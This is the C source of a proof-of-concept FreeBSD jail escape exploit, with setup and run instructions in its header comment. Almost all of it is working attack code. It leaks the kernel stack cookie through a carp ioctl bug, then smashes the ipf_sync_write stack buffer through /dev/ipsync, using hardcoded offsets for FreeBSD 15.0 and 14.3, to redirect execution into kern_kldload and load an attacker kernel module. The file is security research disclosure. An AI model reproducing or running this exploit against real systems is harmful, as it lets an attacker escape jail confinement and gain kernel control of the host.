/*
Prisonbreak
-----------
Proof of concept jail escape exploit for x86-64 FreeBSD by Ilja van Sprundel and Michael Smith.

https://github.com/iljavs/FreeBSD-Jail-Security-Research

TODO: Moar disclaimer / license info?

Prerequisites
-------------
1. Host must have carp kernel module loaded

sysrc kld_list+="carp"
kldload carp

2. Host must have ipfilter kernel module loaded

sysrc kld_list+="ipfilter"
kldload ipfilter


3. ipfilter device /dev/ipsync must be visible in jail

cat << 'EOF' > /etc/devfs.rules
[devfsrules_ipf=5]
add path ipsync    unhide
EOF

service devfs restart
service jail restart prisonbreak

How to run
----------
1. Copy the poc/prisonbreak-1 directory over to a supported FreeBSD jail with root access
2. Build the prisonbreak kernel module: cd module && make && cp prisonbreak.ko ../ && cd ..
3. Build the prisobreak exploit: make
4. Run the prisonbreak exploit shell script: ./exploit.sh
5. Profit (of all the knowledge you have gained, not financially)
*/

#include <arpa/inet.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <net/if.h>
#include <netinet/ip_carp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/user.h>
#include <unistd.h>
#include <sys/utsname.h>

#define u_32_t unsigned int

// get_stack_cookie() configuration
#define NUM_CARP_IFS 12
#define IF_NAME "epair100b"

// prisonbreak() configuration
#define USER_MAPPED_MEMORY_ADDRESS 0x0000414141410000ULL
#define USER_MAPPED_MEMORY_LEN 4096
#define USER_MAPPED_MEMORY_PAGES 4

typedef struct synchdr {
  u_32_t sm_magic; /* magic */
  u_char sm_v;     /* version: 4,6 */
  u_char sm_p;     /* protocol */
  u_char sm_cmd;   /* command */
  u_char sm_table; /* NAT, STATE, etc */
  u_int sm_num;    /* table entry number */
  int sm_rev;      /* forward/reverse */
  int sm_len;      /* length of the data section */
  void* sm_sl;     /* back pointer to parent */
} synchdr_t;

enum { MSG_NOT_READY = 0, MSG_READY = 1, MSG_DONE = 2 };

struct print_msg {
  unsigned int entry_ready;
  unsigned int len;
  char msg[0];
};

enum { FBSD_15_GENERIC = 0, FBSD_14_DEBUG = 1, PLATFORM_UNKNOWN = 2 };

struct kernel_offsets {
  unsigned int ipsync_buffer_overlow_size;
  unsigned int stack_cookie_offset;
  unsigned int td_offset;
  unsigned int kernel_module_path_offset;
  unsigned int fileid_offset;
  unsigned int base_pointer_offset;
  unsigned int instruction_pointer_offset;
  uint64_t restored_ebp_address;
  uint64_t kern_kldload_address;
};

/*
 * [0] FreeBSD 15.0-RELEASE GENERIC
 * [1] FreeBSD 14.3-RELEASE GENERIC-DEBUG
 */
static const struct kernel_offsets koffsets[] = {
    /* FreeBSD 15.0-RELEASE GENERIC */
    {
        .ipsync_buffer_overlow_size = 2896,
        .stack_cookie_offset = 2832,
        .td_offset = 2848,                 /* 2872 - 24 */
        .kernel_module_path_offset = 2872, /* 2864 + 8 */
        .fileid_offset = 2863,             /* 2840 + 23 */
        .base_pointer_offset = 2880,
        .instruction_pointer_offset = 2888,
        .restored_ebp_address = 0xfffffe0070e098d8, /* 0xfffffe0070e09cc0 - 1000 */
        .kern_kldload_address = 0xffffffff80b3db70,
    },

    /* FreeBSD 14.3-RELEASE GENERIC-DEBUG */
    {
        .ipsync_buffer_overlow_size = 2896,
        .stack_cookie_offset = 2832,
        .td_offset = 2872,
        .kernel_module_path_offset = 2864,
        .fileid_offset = 2840,
        .base_pointer_offset = 2880,
        .instruction_pointer_offset = 2888,
        .restored_ebp_address = 0xfffffe0070e09cc0,
        .kern_kldload_address = 0xffffffff80af7af0,
    }};

void cyclic_pattern(char* buf, size_t len) {
  const char set1[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const char set2[] = "abcdefghijklmnopqrstuvwxyz";
  const char set3[] = "0123456789";

  size_t pos = 0;

  for (size_t i = 0; i < sizeof(set1) - 1; i++) {
    for (size_t j = 0; j < sizeof(set2) - 1; j++) {
      for (size_t k = 0; k < sizeof(set3) - 1; k++) {
        if (pos + 3 > len) return;

        buf[pos++] = set1[i];
        buf[pos++] = set2[j];
        buf[pos++] = set3[k];

        if (pos >= len) return;
      }
    }
  }
}

unsigned long get_td() {
  int mib[4];
  struct kinfo_proc kp;
  size_t len = sizeof(kp);
  pid_t pid = getpid();

  /* mib = { CTL_KERN, KERN_PROC, KERN_PROC_PID, pid } */
  mib[0] = CTL_KERN;
  mib[1] = KERN_PROC;
  mib[2] = KERN_PROC_PID;
  mib[3] = pid;

  if (sysctl(mib, 4, &kp, &len, NULL, 0) == -1) {
    err(1, "sysctl(KERN_PROC_PID)");
  }

  if (len < sizeof(kp)) {
    fprintf(stderr, "sysctl returned too little data (len=%zu)\n", len);
    return 1;
  }

  return (unsigned long)kp.ki_tdaddr;
}

unsigned long get_pargs() {
  int mib[4];
  struct kinfo_proc kp;
  size_t len = sizeof(kp);
  pid_t pid = getpid();

  /* mib = { CTL_KERN, KERN_PROC, KERN_PROC_PID, pid } */
  mib[0] = CTL_KERN;
  mib[1] = KERN_PROC;
  mib[2] = KERN_PROC_PID;
  mib[3] = pid;

  if (sysctl(mib, 4, &kp, &len, NULL, 0) == -1) {
    err(1, "sysctl(KERN_PROC_PID)");
  }

  if (len < sizeof(kp)) {
    fprintf(stderr, "sysctl returned too little data (len=%zu)\n", len);
    return 1;
  }

  return (unsigned long)kp.ki_args + 50;
}

unsigned int get_platform_idx() {
  // Get kernel config name (e.g. GENERIC, GENERIC-DEBUG, ...)
  char kern_ident[256];
  size_t kern_ident_len = sizeof(kern_ident);

  if (sysctlbyname("kern.ident", kern_ident, &kern_ident_len, NULL, 0) == -1) {
    return PLATFORM_UNKNOWN;
  }

  // Get release (e.g. 14.3-RELEASE, 15.0-RELEASE, ...) via POSIX uname(2)
  struct utsname u;
  if (uname(&u) == -1) {
    return PLATFORM_UNKNOWN;
  }

  /* FreeBSD 14.3 GENERIC-DEBUG */
  if (strcmp(u.release, "14.3-RELEASE") == 0) {
    if (strcmp(kern_ident, "GENERIC-DEBUG") == 0) return FBSD_14_DEBUG;

    return PLATFORM_UNKNOWN;
  }

  /* FreeBSD 15.0 GENERIC */
  if (strcmp(u.release, "15.0-RELEASE") == 0) {
    if (strcmp(kern_ident, "GENERIC") == 0) return FBSD_15_GENERIC;

    return PLATFORM_UNKNOWN;
  }

  return PLATFORM_UNKNOWN;
}

void write_uint64(char* ptr, unsigned int offset, uint64_t value) {
  char* dest = ptr + offset;
  uint64_t* u64dest = (uint64_t*)dest;
  *u64dest = value;
}

/*
 *
 * 1. Get the stack cookie through a kernel memory leak bug
 *
 * See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
 */
uint64_t get_stack_cookie() {
  int sock;
  struct carpreq carpr_set;
  struct carpreq carpr_get[NUM_CARP_IFS];
  struct ifreq ifr_set;
  struct ifreq ifr_get;
  uint64_t stack_cookie;

  bzero(&carpr_set, sizeof(struct carpreq));
  bzero(carpr_get, sizeof(carpr_get));

  ifr_get.ifr_data = (caddr_t)&carpr_get;
  ifr_set.ifr_data = (caddr_t)&carpr_set;

  carpr_get[0].carpr_vhid = 0;  // Instruct kernel we want info on all carp interfaces
  carpr_get[0].carpr_count = NUM_CARP_IFS;

  strlcpy(ifr_get.ifr_name, IF_NAME, sizeof(ifr_get.ifr_name));
  strlcpy(ifr_set.ifr_name, IF_NAME, sizeof(ifr_set.ifr_name));

  sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0) {
    perror("socket");
    exit(1);
  }

  // Create some carp interfaces.
  // We need more than one carp interface defined on one physical interface to
  // force the kernel to trigger the implementation bug that causes the memory
  // leak. See
  // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
  //
  // NOTE(m): Defining multiple carp interfaces on one physical interface does
  // not seem possible using `ifconfig(8)`, either by design or because of a
  // subtle locking bug (see https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
  for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
    carpr_set.carpr_vhid = i;
    if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
      perror("ioctl");
      exit(1);
    }
  }

  // Enumerate the carp interfaces...
  // and leak some kernel memory while we're at it,
  // i.e., get an unsuspecting prison guard's access badge.
  if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
    perror("ioctl");
    exit(1);
  }

  // Extract the stack cookie from the leaked kernel memory
  const unsigned char* base = (const unsigned char*)carpr_get;
  size_t offset_stack_cookie = sizeof(struct carpreq);  // start of carpr_get[1]
  memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
  printf("STACK COOKIE: 0x%016" PRIx64 "\n", stack_cookie);

  close(sock);
  return stack_cookie;
}

/*
 *
 * 2. Use the retrieved stack cookie in a classic stack smash attack
 *
 * https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/13
 */
void* prisonbreak(void* arg) {
  uint64_t stack_cookie = get_stack_cookie();

  int fd = open("/dev/ipsync", O_RDWR);

  if (fd < 0) {
    printf("Error: failed to open /dev/ipsync\n");
    exit(0);
  }
  unsigned int idx = get_platform_idx();
  if (idx == PLATFORM_UNKNOWN) {
    printf("Unsupported FreeBSD version and kernel configuration for this exploit\n");
    exit(0);
  }
  struct kernel_offsets ko = koffsets[idx];

  // We need to write len bytes to the char data[2048] local buffer allocated by
  // `ipf_sync_write()` in sys/netpfil/ipfilter/netinet/ip_sync.c:420 in order
  // to overflow the stack with data we control. The calculated length accounts
  // for other locals, padding, the stack cookie, saved registers, the caller's
  // frame pointer and finally the saved return address.
  // In other words, we need to dig a long enough tunnel.
  int len = ko.ipsync_buffer_overlow_size;
  synchdr_t* header = malloc(len);

  // Fill the buffer with some easily recognizable bogus data (ASCII 'A')
  // memset(header, 0x41, len);
  // or fill the buffer with cyclic data to make it easy to calculate offsets
  cyclic_pattern((char*)header, len);

  // Restore the stack cookie at the location we know it should go, using the
  // value extracted earlier to please the stack protection checker 2048 + 32 =
  // 2080 (start of our overflow) + 752 bytes = 2832
  // i.e., use the badge we got off that guard.
  write_uint64((char*)header, ko.stack_cookie_offset, stack_cookie);

  // Overwrite the address where kern_kldload is going to read the td argument
  write_uint64((char*)header, ko.td_offset, get_td());

  // Overwrite the address where kern_kldload is going to read the string
  // containing our custom kernel module path
  write_uint64((char*)header, ko.kernel_module_path_offset, get_pargs());

  // Overwrite the address where kern_kldload is going to read the fileid
  write_uint64((char*)header, ko.fileid_offset, 0);

  // Restore $rbp
  write_uint64((char*)header, ko.base_pointer_offset, ko.restored_ebp_address);

  // Overwrite the return address to jump into something we can use, e.g. `kern_kldload()`.
  // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
  // making sure none of the guards spot us.
  write_uint64((char*)header, ko.instruction_pointer_offset, ko.kern_kldload_address + 69);

  // Populate the header with expected values so we pass all the checks and get
  // to where we need to be, i.e., have another inmate create a diversion by setting their mattress on fire.
  header->sm_magic = htonl(0x0FF51DE5);
  header->sm_v = 4;
  header->sm_p = 4;
  header->sm_cmd = 1;  // 0 here causes a NAT expire event to trigger at some point in the future,
                       // resulting in a host panic. We don't want the alarm to go off.
  header->sm_table = 0;
  header->sm_num = 0;
  header->sm_rev = 0;
  header->sm_len = htonl(len - sizeof(synchdr_t));
  header->sm_sl = NULL;

  int wlen = write(fd, header, len);
  if (wlen == -1) {
    perror("Error writing to /dev/ipsync");
    printf("errno: %d\n", errno);
  }

  printf("FAILED to break out of prison. You have died of this and Terry.\n");
  close(fd);

  return NULL;
}

int map_memory() {
  size_t pages = USER_MAPPED_MEMORY_PAGES;
  size_t len = USER_MAPPED_MEMORY_LEN * pages;

  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;

  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_PRIVATE | MAP_ANONYMOUS;

  char* p = mmap(fixed, len, prot, flags | MAP_FIXED, -1, 0);
  if (p == MAP_FAILED) {
    fprintf(stderr, "mmap failed: %s\n", strerror(errno));
    return 1;
  }

  printf("Mapped %zu bytes (%zu pages) at fixed address %p\n", len, pages, p);
  memset(p, 0x00, len);

  return 0;
}

void dispatch_messages() {
  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;
  struct print_msg* msg = fixed;

  while (1) {
    while (msg->entry_ready == MSG_NOT_READY);

    if (msg->entry_ready == MSG_DONE) {
      printf("Final message received. Exploit done. You've probably made it out of prison.\n");

      return;
    }

    printf("MSG: %s", msg->msg);
    msg = (struct print_msg*)(((char*)msg) + msg->len + sizeof(struct print_msg));
  }
}

int main() {
  map_memory();
  pthread_t thread1;

  if (pthread_create(&thread1, NULL, prisonbreak, NULL) != 0) {
    perror("pthread_create");
    return 1;
  }

  dispatch_messages();

  return 0;
}
